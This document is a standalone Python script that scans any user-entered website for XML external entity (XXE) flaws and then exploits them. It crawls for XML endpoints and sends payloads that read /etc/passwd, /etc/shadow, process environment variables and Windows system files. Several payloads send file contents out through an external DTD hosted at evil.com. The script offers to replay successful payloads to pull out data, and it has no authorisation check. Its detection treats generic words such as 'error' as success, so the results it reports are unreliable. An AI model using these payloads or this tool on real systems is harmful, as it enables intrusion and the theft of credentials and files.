import requests
import xml.etree.ElementTree as ET
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import time

def find_xml_endpoints(url):
    endpoints = []
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        forms = soup.find_all('form')
        for form in forms:
            if form.get('enctype') == 'application/xml' or form.get('enctype') == 'text/xml':
                action = form.get('action', '')
                
                endpoints.append(urljoin(url, action))
        
        if not endpoints:
            endpoints = [
                urljoin(url, '/upload'),
                urljoin(url, '/api/xml'),
                urljoin(url, '/process'),
                urljoin(url, '/import'),
                url
            ]
    except requests.exceptions.RequestException:
        endpoints = [url]
    
    return list(set(endpoints))

def generate_xxe_payloads():
    base_files = [
        '/etc/passwd',
        '/etc/hosts',
        'file:///C:/Windows/win.ini',
        'file:///C:/boot.ini',
        '/proc/self/environ',
        '/etc/shadow',
        '../../../../../../etc/passwd'
    ]
    
    xxe_payloads = []
    
    for file_path in base_files:
        payloads = [

            f'''<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "{file_path}">
]>
<root>&xxe;</root>''',

            f'''<?xml version="1.0" ?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "{file_path}" >]>
<foo>&xxe;</foo>''',

            f'''<?xml version="1.0" ?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "{file_path}">
<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">
%dtd;]>
<data>&send;</data>''',

            f'''<?xml version="1.0" ?>
<!DOCTYPE data [
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "{file_path}">
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">
%dtd;]>
<data>&all;</data>''',

            f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
<!ENTITY % xxe SYSTEM "{file_path}">
%xxe;]>
<test>%xxe;</test>''',

            f'''<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "{file_path}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://evil.com/?x=%file;'>">
%eval;
%exfil;]>
<data></data>'''
        ]
        xxe_payloads.extend(payloads)
    
    return xxe_payloads

def detect_successful_xxe(response_text):
    indicators = [
        "root:x:",
        "USER=",
        "PATH=",
        "[boot loader]",
        "[fonts]",
        "/bin/bash",
        "localhost",
        "127.0.0.1",
        "shadow",
        "mysql",
        "admin:",
        "/home/",
        "/var/",
        "error",
        "exception",
        "failed",
        "file not found"
    ]
    
    return any(indicator.lower() in response_text.lower() for indicator in indicators)

def scan_xxe(url):
    print(f"Scanning {url} for XXE vulnerabilities...")
    
    endpoints = find_xml_endpoints(url)
    xxe_payloads = generate_xxe_payloads()
    vulnerabilities = []
    
    headers = {
        'Content-Type': 'application/xml',
        'Accept': '*/*',
        'X-Requested-With': 'XMLHttpRequest'
    }
    
    for endpoint in endpoints:
        print(f"\nTesting endpoint: {endpoint}")
        
        for idx, xxe_payload in enumerate(xxe_payloads, 1):
            print(f"Testing payload {idx}/{len(xxe_payloads)}...", end='\r')
            
            try:
                response = requests.post(
                    endpoint,
                    data=xxe_payload,
                    headers=headers,
                    timeout=10,
                    verify=False
                )
                
                if detect_successful_xxe(response.text):
                    vulnerability = {
                        'endpoint': endpoint,
                        'payload': xxe_payload,
                        'response': response.text[:500],
                        'status_code': response.status_code
                    }
                    vulnerabilities.append(vulnerability)
                    print(f"\nPotential XXE vulnerability found at {endpoint}!")
                
                time.sleep(0.5)
            
            except requests.exceptions.RequestException as e:
                print(f"\nError testing payload {idx}: {str(e)}")
                continue
    
    return vulnerabilities

def exploit_xxe(url, vulnerabilities):
    if not vulnerabilities:
        return "No vulnerabilities to exploit."
    
    results = []
    headers = {
        'Content-Type': 'application/xml',
        'Accept': '*/*'
    }
    
    for vuln in vulnerabilities:
        try:
            print(f"\nExploiting vulnerability at {vuln['endpoint']}...")
            response = requests.post(
                vuln['endpoint'],
                data=vuln['payload'],
                headers=headers,
                timeout=15,
                verify=False
            )
            
            if response.status_code != 200:
                results.append(f"Exploit failed with status code: {response.status_code}")
                continue
            
            results.append(f"Endpoint: {vuln['endpoint']}\nResponse:\n{response.text[:1000]}")
        
        except requests.exceptions.RequestException as e:
            results.append(f"Exploit error: {str(e)}")
    
    return "\n\n".join(results)

def main():
    target_url = input("Enter the URL of the website to test for XXE: ").strip()
    if not target_url.startswith(('http://', 'https://')):
        print("Please enter a valid URL starting with http:// or https://")
        return
    
    print("\nStarting XXE vulnerability scan...")
    vulnerabilities = scan_xxe(target_url)
    
    if vulnerabilities:
        print("\nVulnerabilities found:")
        for idx, vuln in enumerate(vulnerabilities, 1):
            print(f"\nVulnerability #{idx}:")
            print(f"Endpoint: {vuln['endpoint']}")
            print(f"Status Code: {vuln['status_code']}")
            print("Response Preview:")
            print(vuln['response'])
        
        if input("\nAttempt to exploit found vulnerabilities? (y/n): ").lower() == 'y':
            print("\nAttempting to exploit vulnerabilities...")
            result = exploit_xxe(target_url, vulnerabilities)
            print("\nExploit Results:")
            print(result)
    else:
        print("\nNo XXE vulnerabilities detected.")

if __name__ == "__main__":
    main()